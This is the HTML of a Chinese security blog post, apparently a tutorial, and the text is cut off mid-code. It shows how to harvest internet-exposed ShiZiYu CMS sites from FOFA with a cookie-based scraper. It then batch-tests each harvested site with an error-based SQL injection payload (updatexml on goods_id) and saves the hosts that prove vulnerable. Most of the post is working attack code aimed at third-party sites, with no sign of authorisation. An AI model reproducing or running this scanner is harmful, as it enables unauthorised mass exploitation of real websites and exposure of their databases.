@@ -1,0 +1,718 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>我的技术与生活——安全开发实战(6)---对fofa收集的漏洞资产使用poc进行批量验证 | Hexo</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <link rel="shortcut icon" href="/imgs/shortcut-icon.ico" type="image/x-icon">
+  <link rel="stylesheet" href="/css/public.css" />
+  <link rel="stylesheet" href="/css/layout.css" />
+  <link rel="stylesheet" href="/css/iconfont.css" />
+  <link rel="stylesheet" href="/css/APlayer.min.css" />
+  <script src="/js/APlayer.min.js"></script>
+  <script src="/js/jquery.min.js"></script>
+  <script src="/js/jquery.pjax.min.js"></script>
+
+  <script src='//unpkg.com/valine/dist/Valine.min.js'></script>
+  <script>
+    document.title = `我的技术与生活——安全开发实战(6)---对fofa收集的漏洞资产使用poc进行批量验证`
+  </script>
+<meta name="generator" content="Hexo 7.1.1"></head>
+
+<style>
+  .load {
+    width: 100%;
+    height: 100vh;
+    background-color: rgb(37, 35, 40);
+    display: flex;
+    flex-direction: column;
+    justify-content: center;
+    align-items: center;
+    position: relative;
+    z-index: 9999;
+  }
+  .load-circle {
+    width: 80px;
+    height: 80px;
+    border: 8px solid orange;
+    border-bottom-color: transparent;
+    border-radius: 50%;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    animation: rotate 1s linear infinite;
+    filter: drop-shadow(0 0 3px orange);
+  }
+  .load-circle-inner {
+    width: 40px;
+    height: 40px;
+    border: 8px solid orange;
+    border-top-color: transparent;
+    border-radius: 50%;
+    animation: rotate-reverse .5s linear infinite;
+  }
+  .load-text {
+    margin-top: 20px;
+    font-size: 24px;
+    color: orange;
+    display: flex;
+  }
+  .load-text span {
+    margin: 0 5px;
+    text-shadow: 5px 5px 5px orange;
+    animation: move 1s linear infinite;
+  }
+  .load-text span:nth-child(1) {
+    animation-delay: -0.6s;
+  }
+  .load-text span:nth-child(2) {
+    animation-delay: -0.5s;
+  }
+  .load-text span:nth-child(3) {
+    animation-delay: -0.4s;
+  }
+  .load-text span:nth-child(4) {
+    animation-delay: -0.3s;
+  }
+  .load-text span:nth-child(5) {
+    animation-delay: -0.2s;
+  }
+  .load-text span:nth-child(6) {
+    animation-delay: -0.1s;
+  }
+  @keyframes rotate {
+    0% { transform: rotate(0); }
+    100% { transform: rotate(360deg); }
+  }
+  @keyframes rotate-reverse {
+    0% { transform: rotate(0); }
+    100% { transform: rotate(-360deg); }
+  }
+  @keyframes move {
+    0% { transform: translateY(0%) rotate(0) scale(1); }
+    20% { transform: translateY(20%) rotate(10deg) scale(1.2); }
+    80% { transform: translateY(-10%) rotate(-20deg) scale(.8);}
+    100% { transform: translateY(0) rotate(0) scale(1); }
+  }
+
+  .progress {
+    position: fixed;
+    left: 0; top: 0;
+    width: 0;
+    height: 3px;
+    background-color: green;
+    transition: all cubic-bezier(0.215, 0.610, 0.355, 1) .1s;
+    z-index: 9999;
+  }
+
+  .to-up {
+    animation: toUp .5s 1;
+  }
+  .gray {
+    position: fixed;
+    left: 0;
+    top: 0;
+    width: 100%;
+    height: 100vh;
+    z-index: 9999;
+    display: none;
+    pointer-events: none;
+    background-color: #000;
+    mix-blend-mode: color;
+  }
+  @keyframes toUp {
+    from { transform: translateY(15px); opacity: 0; }
+    to { transform: translateY(0) ; opacity: 1; }
+  }
+</style>
+<body>
+  <div id="load" class="load">
+    <div class="load-circle">
+      <div class="load-circle-inner"></div>
+    </div>
+    <p class="load-text">
+      <span>L</span>
+      <span>O</span>
+      <span>A</span>
+      <span>D</span>
+      <span>I</span>
+      <span>N</span>
+      <span>G</span>
+    </p>
+  </div>
+  <div id="container" class="container w-100 vh-100" style="display: none;">
+    <header class="header">
+  <div class="header-wrapper">
+    <div class="header-left">
+      <div class="header-search">
+        <input id="search-input" type="text" class="header-search--input" placeholder="请输入要检索的文章标题" />
+        <span id="search-btn" class="header-search--icon"><i class="iconfont icon-sousuo"></i></span>
+      </div>
+      <div id="search-layer" class="header-search--layer hidden">
+        <p class="title">
+          <span>以下是搜索内容：</span>
+          <span id="close-layer-btn">关闭</span>
+        </p>
+        <ul>
+        </ul>
+      </div>
+    </div>
+    <div class="header-right">
+      <ul class="header-menu">
+        <li>
+          <a href="http://example.com/">
+            <i class="header-menu--icon iconfont icon-shouye"></i>
+            <span class="header-menu--span">首页</span>
+          </a>
+        </li>
+        <li>
+          <a href="http://example.com/log">
+            <i class="header-menu--icon iconfont icon-rizhi"></i>
+            <span class="header-menu--span">日志</span>
+          </a>
+        </li>
+        <li>
+          <a href="http://example.com/link">
+            <i class="header-menu--icon iconfont icon-youqinglianjie"></i>
+            <span class="header-menu--span">友情链接</span>
+          </a>
+        </li>
+        <li>
+          <a href="http://example.com/about">
+            <i class="header-menu--icon iconfont icon-guanyuwomen"></i>
+            <span class="header-menu--span">关于我</span>
+          </a>
+        </li>
+      </ul>
+    </div>
+  </div>
+</header>
+
+<script>
+  const ipt = document.querySelector('#search-input')
+  const btn = document.querySelector('#search-btn')
+  const layer = document.querySelector('#search-layer')
+  const posts = JSON.parse(`[{"title":"免杀开发基础(1)","path":"2024/04/12/免杀开发基础-1/"},{"title":"如何从小程序到教务系统","path":"2024/04/09/如何从小程序到教务系统/"},{"title":"安全开发实战(2)---域名反查IP","path":"2024/04/30/安全开发实战-2-域名反查IP/"},{"title":"Hexo的使用","path":"2024/04/03/Hexo的使用/"},{"title":"安全开发实战(3)---存活探测与端口扫描","path":"2024/04/30/安全开发实战-3-存活探测与端口扫描/"},{"title":"安全开发实战(4)---whois与子域名爆破","path":"2024/04/30/安全开发实战-4-whois与子域名爆破/"},{"title":"安全开发实战(5)---fofa进行漏洞poc的信息收集","path":"2024/04/30/安全开发实战-5-fofa进行漏洞poc的信息收集/"},{"title":"某小学AK,SK泄露导致横向到云主机控制台","path":"2024/04/16/某小学AK-SK泄露导致横向到云主机控制台/"},{"title":"安全开发实战(6)---对fofa收集的漏洞资产使用poc进行批量验证","path":"2024/04/30/安全开发实战-6-对fofa收集的漏洞资产使用poc进行批量验证/"},{"title":"小白如何挖到自己的第一个漏洞","path":"2024/04/07/小白如何挖到自己的第一个漏洞/"},{"title":"某音矩阵云混剪系统V2.3.0代码审计(1)","path":"2024/04/25/某音矩阵云混剪系统V2-3-0代码审计-1/"},{"title":"网安开发实战(1)-Cdn","path":"2024/04/16/网安开发实战-1-Cdn/"},{"title":"记第一次eudsrc拿到RCE(下)","path":"2024/04/06/记第一次eudsrc拿到RCE-下/"},{"title":"记第一次eudsrc拿到RCE(上)","path":"2024/04/05/记第一次edusrc拿到RCE-上/"}]`)
+  ipt.addEventListener('keyup', e => {
+    if (e.key === 'Enter') {
+      handleSearch()
+    }
+  })
+  btn.addEventListener('click', () => {
+    handleSearch()
+  })
+
+  document.querySelector('#close-layer-btn').addEventListener('click', () => {
+    layer.classList.toggle('hidden')
+  })
+
+  function handleSearch() {
+    if (ipt.value.trim() === '') {
+      return
+    }
+    let html = ''
+    const targetPosts = posts.filter(post => post.title.includes(ipt.value))
+    targetPosts.forEach(post => {
+      html += `
+        <li>
+          <div>
+            <a href="/${post.path}">${post.title.replace(new RegExp(ipt.value), `<span>${ipt.value}</span>`)}</a>
+          </div>
+          <img src="${post.cover || '/imgs/default-cover.webp' }" />
+        </li>
+      `
+    })
+    if (html.trim () === '') {
+      html += '<p class="empty">没有搜索到内容</p>'
+    }
+    layer.querySelector('ul').innerHTML = html
+    layer.classList.remove('hidden')
+  }
+</script> 
+    <section id="main" class="main">
+      <div class="main-left-wrapper">
+<div class="main-left">
+  <div class="main-left--block">
+    <div class="main-left--info">
+      <img src="/imgs/avatar.jpg"" class="main-left--avatar" />
+      <div class="main-left--intro">
+        <p class="main-left--name">小鱼</p>
+        <div class="main-left--tags">
+          <span class="main-left--tag">渗透测试</span>
+          <span class="main-left--tag">善于观察</span>
+        </div>
+      </div>
+    </div>
+  
+    <div>
+      <div class="main-left--motto">
+        <p>“花有重开日，人无再少年”</p>
+        <p>“一个简单普通的男孩”</p>
+      </div>
+      <div class="main-left--github">
+        <span class="line"></span>
+        <a target="_blank" rel="noopener" href="https://gitee.com/ccshyi"><i class="logo iconfont icon-github-fill"></i></a>
+        <span class="line"></span>
+      </div>
+      <div class="main-left--statics">
+        <a href="/categories">
+          <div>
+            <span>6</span>
+            <span>分类</span>
+          </div>
+        </a>
+        <a href="/tags">
+          <div>
+            <span>6</span>
+            <span>标签</span>
+          </div>
+        </a>
+        <a href="/archives">
+          <div>
+            <span>1 </span>
+            <span>归档</span>
+          </div>
+        </a>
+      </div>
+    </div>
+  </div>
+
+  <div class="main-left--block">
+    <ul class="main-left--menu">
+      
+        <li>
+          <a href="/">
+            <span class="header-menu--span">小站首页</span>
+            <i class="header-menu--icon iconfont icon-shouye"></i>
+          </a>
+        </li>
+      
+        <li>
+          <a href="/log">
+            <span class="header-menu--span">个人日志</span>
+            <i class="header-menu--icon iconfont icon-rizhi"></i>
+          </a>
+        </li>
+      
+        <li>
+          <a href="/link">
+            <span class="header-menu--span">友情链接</span>
+            <i class="header-menu--icon iconfont icon-youqinglianjie"></i>
+          </a>
+        </li>
+      
+        <li>
+          <a href="/about">
+            <span class="header-menu--span">关于自己</span>
+            <i class="header-menu--icon iconfont icon-guanyuwomen"></i>
+          </a>
+        </li>
+      
+        <li>
+          <a href="/tools">
+            <span class="header-menu--span">我的工具</span>
+            <i class="header-menu--icon iconfont icon-gongju"></i>
+          </a>
+        </li>
+      
+    </ul>
+  </div>
+
+  <div class="main-left--block">
+    <div class="main-left--site">
+      <h5 class="main-left--title">
+        <span>站点信息</span>
+        <i class="iconfont icon-zhandian"></i>
+      </h5>
+      <p class="main-left--subtitle">
+        <span>文章数目：</span>
+        <span>14 篇</span>
+      </p>
+      <p class="main-left--subtitle">
+        <span>最近动态：</span>
+        <span>今天</span>
+      </p>
+      <p class="main-left--subtitle">
+        <span>上线时间：</span>
+        <span>29天</span>
+      </p>
+      <p class="main-left--subtitle">
+        <span>当前版本：</span>
+        <span>v1.0.2</span>
+      </p>
+    </div>
+  </div>
+</div></div>
+      <div id="main-container" class="main-container">
+
+
+  <link rel="stylesheet" href="/css/partial/article.css" />
+
+<div class="article-container">
+  <div class="article">
+    <h1 class="article-title">安全开发实战(6)---对fofa收集的漏洞资产使用poc进行批量验证</h1>
+    <div class="article-info">
+      <div class="article-info--item">
+        <div class="article-info--info">
+          
+          <div class="article-info--categories">
+            <span>分类：</span>
+            <a class="category-link" href="/categories/%E5%AE%89%E5%85%A8%E5%BC%80%E5%8F%91/">安全开发</a>
+          </div>
+          
+          
+          <div class="article-info--tags">
+            <span>标签：</span>
+            <a class="tag-link" href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" rel="tag">渗透测试</a>
+          </div>
+          
+          <p class="article-info--date">日期：2024-04-30 21:52:56</p>
+        </div>
+        <img src="/imgs/default-cover.webp" alt="" class="article-cover">
+      </div>
+    </div>
+    <article class="article-content markdown-body">
+      <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><blockquote>
+<pre><code>主要还是围绕渗透测试的流程进行开发,一般在信息收集后,在渗透测试后,在发现通用型漏洞时,我们为了节省时间,可以通过写批量脚本来信息收集,然后使用poc来进行批量验证.
+</code></pre>
+<p>​    紧接着上一篇文章西了一个使用fofa<strong>脚本突破注册会员限制进行信息爬取</strong>.但是对收集的CVE-2019-2725 weblogic 未授权远程代码的信息进行批量验证时发现,收集的信息居然一个漏洞都没有</p>
+<p>可能是因为漏洞出现太早了被别人刷没了,所以没有了,所以用之前写的狮子鱼批量监测作为演示吧,算是一个编写通用脚本的演示,这个现在漏洞存在还挺多的</p>
+</blockquote>
+<h1 id="狮子鱼cms-SQL注入"><a href="#狮子鱼cms-SQL注入" class="headerlink" title="狮子鱼cms-SQL注入"></a>狮子鱼cms-<a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=SQL%E6%B3%A8%E5%85%A5&spm=1001.2101.3001.7020">SQL注入</a></h1><blockquote>
+<p>狮子鱼CMS ApiController.class.php 参数过滤存在不严谨，导致SQL注入漏洞</p>
+</blockquote>
+<h2 id="1-FOFA收集漏洞信息语法："><a href="#1-FOFA收集漏洞信息语法：" class="headerlink" title="1.FOFA收集漏洞信息语法："></a>1.FOFA收集漏洞信息语法：</h2><h3 id="1-1-收集语法及解释"><a href="#1-1-收集语法及解释" class="headerlink" title="1.1.收集语法及解释"></a>1.1.收集语法及解释</h3><p>   这里解释一下语法的意思,其实是搜索,URL出含有下面语句的资产,狮子鱼的开发时的特征</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;/seller.php?s=/Public/login&quot;</span></span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="https://xiaoyunxi.oss-cn-zhangjiakou.aliyuncs.com/202404302156897.png"></p>
+<h3 id="1-2-构造XPath匹配"><a href="#1-2-构造XPath匹配" class="headerlink" title="1.2.构造XPath匹配"></a>1.2.构造XPath匹配</h3><p><img src="https://xiaoyunxi.oss-cn-zhangjiakou.aliyuncs.com/202404302156772.png"></p>
+<p>这里直接构造xpath提取</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">//span[@<span class="keyword">class</span>=<span class="string">&quot;hsxa-host&quot;</span>]/a/@href</span><br></pre></td></tr></table></figure>
+
+
+
+<p>  <strong>如果想知道xpath语法如何使用以及如何进行fofa突破注册会员的限制,可以看我上一篇文章</strong></p>
+<p><a target="_blank" rel="noopener" href="http://t.csdnimg.cn/hWVHu">开发实战(5)–fofa进行漏洞poc的信息收集<img src="/%E5%AE%89%E5%85%A8%E5%BC%80%E5%8F%91%E5%AE%9E%E6%88%98-6-%E5%AF%B9fofa%E6%94%B6%E9%9B%86%E7%9A%84%E6%BC%8F%E6%B4%9E%E8%B5%84%E4%BA%A7%E4%BD%BF%E7%94%A8poc%E8%BF%9B%E8%A1%8C%E6%89%B9%E9%87%8F%E9%AA%8C%E8%AF%81/icon-default.png" alt="img">http://t.csdnimg.cn/hWVHu</a></p>
+<h3 id="1-3-进行fofa一页的信息收集"><a href="#1-3-进行fofa一页的信息收集" class="headerlink" title="1.3.进行fofa一页的信息收集"></a>1.3.进行fofa一页的信息收集</h3><p><strong>这个是怎么写的,以及,如何突破注册会员限制进行超过5页的信息爬取,在我上一篇文章中有提及</strong></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> lxml <span class="keyword">import</span> etree</span><br><span class="line"></span><br><span class="line">fofa_url = <span class="string">&#x27;https://fofa.info/result?qbase64=&#x27;</span></span><br><span class="line">search_worlds = <span class="string">&#x27;&quot;/seller.php?s=/Public/login&quot;&#x27;</span></span><br><span class="line">search_worlds_base64 = base64.b64encode(search_worlds.encode(<span class="string">&#x27;utf-8&#x27;</span>)).decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">url = <span class="built_in">str</span>(fofa_url + search_worlds_base64)</span><br><span class="line"><span class="comment"># print(url)</span></span><br><span class="line"><span class="comment"># 使用verify=false会出现waring警告,去掉警告用下面这条语句</span></span><br><span class="line">requests.packages.urllib3.disable_warnings()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36 Edg/124.0.0.0&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Cookie&#x27;</span>: <span class="string">&#x27;&#x27;</span>  <span class="comment"># 填入自己的cookie,不知道看我上一篇文章怎么获得</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">result = requests.get(url, headers=headers, verify=<span class="literal">False</span>)</span><br><span class="line"><span class="comment"># data = result.content.decode(&#x27;utf-8&#x27;)</span></span><br><span class="line"><span class="comment"># 虽然还是会导致出现的返回的文本中出现乱码,但是可以进行处理</span></span><br><span class="line">data = result.content.decode(<span class="string">&#x27;gbk&#x27;</span>, errors=<span class="string">&#x27;ignore&#x27;</span>)</span><br><span class="line"><span class="comment"># print(data)</span></span><br><span class="line">html = etree.HTML(data)</span><br><span class="line"><span class="comment"># IPaddrs = html.xpath(&#x27;//div[@class=&quot;hsxa-meta-data-item&quot;]/div[@class=&quot;hsxa-clearfix hsxa-meta-data-list-revision-lv1&quot;]/div[@class=&quot;hsxa-fl hsxa-meta-data-list-lv1-lf&quot;]/span[@class=&quot;hsxa-host&quot;]/text()&#x27;)</span></span><br><span class="line">IPaddrs = html.xpath(<span class="string">&#x27;//span[@class=&quot;hsxa-host&quot;]/a/@href&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(IPaddrs)</span><br></pre></td></tr></table></figure>
+
+
+
+<p> <img src="https://xiaoyunxi.oss-cn-zhangjiakou.aliyuncs.com/202404302156144.png"></p>
+<h2 id="2-登录界面"><a href="#2-登录界面" class="headerlink" title="2.登录界面"></a>2.登录界面</h2><h3 id="2-1后台登录界面-一般"><a href="#2-1后台登录界面-一般" class="headerlink" title="2.1后台登录界面(一般)"></a>2.1后台登录界面(一般)</h3><p><img src="https://xiaoyunxi.oss-cn-zhangjiakou.aliyuncs.com/202404302157896.png"></p>
+<h3 id="2-2后台登录界面-特殊"><a href="#2-2后台登录界面-特殊" class="headerlink" title="2.2后台登录界面(特殊)"></a>2.2后台登录界面(特殊)</h3><p>今天测试时,意外发现的不同页面</p>
+<p><img src="https://xiaoyunxi.oss-cn-zhangjiakou.aliyuncs.com/202404302157306.png"></p>
+<h2 id="3-编写验证脚本"><a href="#3-编写验证脚本" class="headerlink" title="3.编写验证脚本"></a>3.编写验证脚本</h2><h3 id="3-1-熟悉漏洞poc"><a href="#3-1-熟悉漏洞poc" class="headerlink" title="3.1 熟悉漏洞poc"></a>3.1 熟悉漏洞poc</h3><blockquote>
+<p>​        <strong>看了下面的poc,学过sql注入的师傅肯定很清楚,就是sql里面的报错注入</strong></p>
+</blockquote>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/index.php?s=api/goods_detail&amp;goods_id=<span class="number">1</span>%<span class="number">20</span><span class="keyword">and</span>%20updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,database(),<span class="number">0x7e</span>),<span class="number">1</span>)</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="3-2-如何进行验证呢"><a href="#3-2-如何进行验证呢" class="headerlink" title="3.2 如何进行验证呢"></a>3.2 如何进行验证呢</h3><blockquote>
+<p>   直接将漏洞poc与我们上面收集的资产直接进行拼接就可以了,如果出现报错页面,那么代表存在漏洞,但是在今天验证的时候,出现的问题,在第二次验证的时候又消失了,等碰到再改脚本吧</p>
+</blockquote>
+<blockquote>
+<p>​            看报错页面,关键部分就是出现一个<strong>syntax</strong>和一个<strong>数据库名</strong></p>
+</blockquote>
+<p><img src="https://xiaoyunxi.oss-cn-zhangjiakou.aliyuncs.com/202404302157644.png"></p>
+<h3 id="3-3-进行编写"><a href="#3-3-进行编写" class="headerlink" title="3.3. 进行编写"></a>3.3. 进行编写</h3><p>​            我把需要编写的几个部分进行拆分一下,方便学习的师傅进行理解</p>
+<h4 id="3-1-1-payload"><a href="#3-1-1-payload" class="headerlink" title="3.1.1.payload"></a>3.1.1.payload</h4><p>​                            进行存储验证poc的变量</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">&quot;/index.php?s=api/goods_detail&amp;goods_id=1%20and%20updatexml(1,concat(0x7e,database(),0x7e),1)&quot;</span></span><br></pre></td></tr></table></figure>
+
+
+
+<h4 id="3-1-2-拼接部分"><a href="#3-1-2-拼接部分" class="headerlink" title="3.1.2.拼接部分"></a>3.1.2.拼接部分</h4><blockquote>
+<p>  就是将收集的资产与payload进行拼接起来的函数,以及写的headers的作用是避免反爬机制,传入的url是从,收集资产的txt文件中,将每条信息进行传入,然后进行后续的拼接.</p>
+</blockquote>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">POC</span>(<span class="params">url</span>):</span><br><span class="line">    target_url = url + payload</span><br><span class="line">    headers = &#123;</span><br><span class="line">        <span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) &quot;</span></span><br><span class="line">                      <span class="string">&quot;Chrome/86.0.4240.111 Safari/537.36&quot;</span>,</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<h4 id="3-1-3-请求与验证部分"><a href="#3-1-3-请求与验证部分" class="headerlink" title="3.1.3.请求与验证部分"></a>3.1.3.请求与验证部分</h4><blockquote>
+<p>​    使用try-except的作用是,如果出现超时,或是错误其他一些错误信息时,可以避免,因为爆破而停止对资产的验证,因为验证方式是使用拼接代表使用get请求进行请求,下面就是将前面写的构造好的url,请求头,以及超时填入.</p>
+</blockquote>
+<blockquote>
+<p>​    用了if判断是通过判断,前面图中,出现爆破页面后,*<em>图中出现明显的sql注入报错词</em>***syntax,**后确定为存在报错注入,避免因为其他报错,而出现误报,其他错误就显示请求失败. </p>
+</blockquote>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    response = requests.get(url=target_url, headers=headers, verify=<span class="literal">False</span>, timeout=<span class="number">10</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;正在测试：&quot;</span>, target_url)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;syntax&quot;</span> <span class="keyword">in</span> response.text:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;上述地址存在SQL注入&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> url</span><br><span class="line"></span><br><span class="line"><span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;请求失败！&quot;</span>)</span><br></pre></td></tr></table></figure>
+
+
+
+<h4 id="3-1-4-传入与保存"><a href="#3-1-4-传入与保存" class="headerlink" title="3.1.4.传入与保存"></a>3.1.4.传入与保存</h4><blockquote>
+<p>   通过个人比较喜欢使用的<strong>with–open</strong>格式进行编写,其实是为了避免遗忘关闭文件,下面就是将资产中存在请求协议的资产进行传入,进行拼接,当然对于没有的资产,我其实是写了一个脚本进行处理的,因为我写的通过<strong>fofa搜集</strong>的资产是没有请求协议的.最后,将返回结果不为空的存在漏洞资产进行保存.</p>
+</blockquote>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;狮子鱼SQL.txt&quot;</span>, <span class="string">&quot;r&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    results = f.readlines()</span><br><span class="line"><span class="keyword">for</span> result <span class="keyword">in</span> results:</span><br><span class="line">    <span class="keyword">if</span> (<span class="string">&quot;http&quot;</span> <span class="keyword">or</span> <span class="string">&quot;https&quot;</span>) <span class="keyword">in</span> result:</span><br><span class="line">        url = result.strip()</span><br><span class="line">        SQL = POC(url)</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;存在狮子鱼SQL注入.txt&quot;</span>, <span class="string">&quot;a+&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;None&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> <span class="built_in">str</span>(SQL):</span><br><span class="line">                f.write(<span class="built_in">str</span>(SQL) + <span class="string">&quot;\n&quot;</span>)</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="3-1-5-对fofa收集的狮子鱼资产进行筛选和处理"><a href="#3-1-5-对fofa收集的狮子鱼资产进行筛选和处理" class="headerlink" title="3.1.5.对fofa收集的狮子鱼资产进行筛选和处理"></a>3.1.5.对fofa收集的狮子鱼资产进行筛选和处理</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 链接处理脚本</span></span><br><span class="line"><span class="comment"># 打开要处理的文件</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;url.txt&quot;</span>, <span class="string">&quot;r&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="comment"># 进行处理后进行存储的文本</span></span><br><span class="line">    f1 = <span class="built_in">open</span>(<span class="string">&quot;new_url.txt&quot;</span>, <span class="string">&quot;w&quot;</span>)</span><br><span class="line">    <span class="keyword">for</span> url <span class="keyword">in</span> f:</span><br><span class="line">        <span class="keyword">if</span> url.startswith(<span class="string">&quot;https&quot;</span>):</span><br><span class="line">            <span class="comment"># 包含协议的ip</span></span><br><span class="line">            <span class="comment"># 将url进行分割，取出协议部分,去除端口部分,并添加&quot;/&quot;,最后去掉没一行的换行</span></span><br><span class="line">            new_url = ((url.split(<span class="string">&quot;:&quot;</span>)[<span class="number">0</span>] + <span class="string">&quot;:&quot;</span> + url.split(<span class="string">&quot;:&quot;</span>)[<span class="number">1</span>]).strip() + <span class="string">&quot;/&quot;</span>).strip()</span><br><span class="line">            <span class="comment"># print(new_url)</span></span><br><span class="line">            <span class="comment">#</span></span><br><span class="line">            f1.write(new_url + <span class="string">&quot;\n&quot;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="comment"># 给不含协议的ip,去除端口部分,并添加协议和&quot;/&quot;</span></span><br><span class="line">            <span class="comment"># 这里因为在组成http协议的链接后会自动换行,所以先去掉换行,然后进行组成</span></span><br><span class="line">            new_url = ((<span class="string">&quot;http://&quot;</span> + url.split(<span class="string">&quot;:&quot;</span>)[<span class="number">0</span>]).strip() + <span class="string">&quot;/&quot;</span>).strip()</span><br><span class="line">            <span class="comment"># print(new_url)</span></span><br><span class="line">            f1.write(new_url + <span class="string">&quot;\n&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;!!!链接已处理完毕!!!&quot;</span>)</span><br></pre></td></tr></table></figure>
+
+
+
+<p>​        其中url.txt中就是是用我写的fofa脚本进行收集的资产,新的是处理后的资产</p>
+<h4 id="3-1-5-完整代码"><a href="#3-1-5-完整代码" class="headerlink" title="3.1.5.完整代码"></a>3.1.5.完整代码</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> urllib3</span><br><span class="line"></span><br><span class="line">urllib3.disable_warnings()  <span class="comment"># 忽略https证书告警</span></span><br><span class="line"></span><br><span class="line">payload = <span 